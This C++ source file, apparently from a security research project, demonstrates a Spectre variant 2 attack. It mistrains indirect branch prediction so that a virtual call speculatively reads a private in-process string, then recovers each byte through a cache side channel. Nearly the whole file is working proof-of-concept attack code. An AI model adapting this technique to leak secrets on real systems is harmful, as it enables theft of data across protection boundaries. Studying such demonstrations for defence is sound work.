/*
 * Copyright 2019 Google LLC
 *
 * Licensed under both the 3-Clause BSD License and the GPLv2, found in the
 * LICENSE and LICENSE.GPL-2.0 files, respectively, in the root directory.
 *
 * SPDX-License-Identifier: BSD-3-Clause OR GPL-2.0
 */

#include <array>
#include <cstring>
#include <iostream>

#include "cache_sidechannel.h"
#include "instr.h"
#include "utils.h"

// Objective: given some control over accesses to the *non-secret* string
// "xxxxxxxxxxxxxx", construct a program that obtains "It's a s3kr3t!!!" without
// ever accessing it in the C++ execution model, using speculative execution and
// side channel attacks. The public data is intentionally just xxx, so that
// there are no collisions with the secret and we don't have to use variable
// offset.
const char *public_data = "xxxxxxxxxxxxxxxx";
const char *private_data = "It's a s3kr3t!!!";
constexpr size_t kAccessorArrayLength = 1024;

// DataAccessor provides an interface to access bytes from either the public or
// the private storage.
class DataAccessor {
 public:
  virtual char GetDataByte(size_t index, bool read_from_private_data) = 0;
  virtual ~DataAccessor() {};
 protected:
  // Helper method that picks the pointer that you want to read from.
  const char *GetDataPtr(bool read_from_private_data) const {
    // This is the same as:
    // return read_from_private_data ? private_data : public_data;
    // It only avoids branching in case it is compiled without optimizations.
    return public_data + (
        private_data - public_data) * static_cast<int>(read_from_private_data);
  }
};

// Behaves exactly by the specification, if you ask for public data, it gives
// you public data, if you ask for private data, you get private data.
class RealDataAccessor: public DataAccessor {
 public:
  char GetDataByte(size_t index, bool read_from_private_data) override {
    return GetDataPtr(read_from_private_data)[index];
  }
};

// It gives you only public data, no matter what you ask for. Useful for cases
// where you never want to leak the private data.
class CensoringDataAccessor: public DataAccessor {
 public:
  char GetDataByte(size_t index, bool /* read_from_private_data */) override {
    return public_data[index];
  }
};

// Leaks the byte that is physically located at private_data[offset], without
// ever loading it. In the abstract machine, and in the code executed by the
// CPU, this function does not load any memory except for what is in the bounds
// of `public_data`, and local auxiliary data.
//
// Instead, the leak is performed by indirect branch prediction during
// speculative execution, mistraining the predictor to jump to the address of
// GetDataByte implemented by RealDataAccessor that is unsafe for
// CensoringDataAccessor.
static char LeakByte(size_t offset) {
  CacheSideChannel sidechannel;
  const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();
  auto array_of_pointers =
      std::unique_ptr<std::array<DataAccessor *, kAccessorArrayLength>>(
          new std::array<DataAccessor *, kAccessorArrayLength>());

  // RealDataAccessor, leaks both private and public data according to the
  // parameter it is provided with.
  auto real_data_accessor = std::unique_ptr<DataAccessor>(
      new RealDataAccessor);

  // CensoringDataAccessor, architecturally leaks only public data and ignores
  // the read_from_private_data parameter.
  auto censoring_data_accessor = std::unique_ptr<DataAccessor>(
      new CensoringDataAccessor);

  for (int run = 0;; ++run) {
    sidechannel.FlushOracle();

    // Before each run all pointers are reset to point to the
    // real_data_accessor.
    for (auto &pointer : *array_of_pointers) {
      pointer = real_data_accessor.get();
    }

    // Only one of the pointers is then changed so that it points to the
    // CensoringDataAccessor. Its index is local_pointer_index.
    size_t local_pointer_index = run % kAccessorArrayLength;
    (*array_of_pointers)[local_pointer_index] = censoring_data_accessor.get();

    for (size_t i = 0; i <= local_pointer_index; ++i) {
      DataAccessor *accessor = (*array_of_pointers)[i];
      // On the local_pointer_index we have the censoring data accessor for
      // which the read_private_data can be true, because that accessor will
      // ignore that argument and use the public data anyway.
      bool read_private_data = (i == local_pointer_index);

      // When i == local_pointer_index, we get size of the
      // CensoringDataAccessor, otherwise of the RealDataAccessor.
      size_t object_size_in_bytes = sizeof(
          RealDataAccessor) + (sizeof(CensoringDataAccessor) - sizeof(
              RealDataAccessor)) * (i == local_pointer_index);

      // We make sure to flush whole accessor object in case it is
      // hypothetically on multiple cache-lines.
      const char *accessor_bytes = reinterpret_cast<const char*>(accessor);
      FlushFromDataCache(accessor_bytes, accessor_bytes + object_size_in_bytes);

      // Speculative fetch at the offset. Architecturally it fetches
      // always from the public_data, though speculatively it fetches the
      // private_data when i is at the local_pointer_index.
      ForceRead(oracle.data() + static_cast<size_t>(
          accessor->GetDataByte(offset, read_private_data)));
    }

    std::pair<bool, char> result =
        sidechannel.RecomputeScores(public_data[offset]);
    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

int main() {
  std::cout << "Leaking the string: ";
  std::cout.flush();
  for (size_t i = 0; i < strlen(public_data); ++i) {
    // On at least some machines, this will print the i'th byte from
    // private_data, despite the only actually-executed memory accesses being
    // to valid bytes in public_data.
    std::cout << LeakByte(i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
